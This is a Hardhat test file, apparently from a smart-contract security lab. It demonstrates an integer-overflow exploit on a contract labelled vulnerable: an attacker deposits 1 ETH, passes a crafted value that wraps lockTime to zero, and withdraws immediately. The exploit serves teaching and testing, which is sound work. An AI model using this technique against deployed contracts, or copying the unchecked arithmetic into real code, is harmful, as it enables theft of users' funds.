const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ATTACK | TimeLock (overflow) - VULNERABLE contract only", function () {
  it("lockTime wraps to 0 and 1 ETH is withdrawn immediately", async function () {
    const [attacker] = await ethers.getSigners();
    const lock = await (await ethers.getContractFactory("TimeLock")).deploy();
    await lock.connect(attacker).deposit({ value: ethers.parseEther("1") });
    const t = await lock.lockTime(attacker.address);
    console.log("      lockTime before:", t.toString());
    await lock.connect(attacker).increaseLockTime(ethers.MaxUint256 - t + 1n);
    console.log("      lockTime after :", (await lock.lockTime(attacker.address)).toString());
    expect(await lock.lockTime(attacker.address)).to.equal(0n);
    await expect(lock.connect(attacker).withdraw())
      .to.changeEtherBalance(attacker, ethers.parseEther("1"));
  });
});
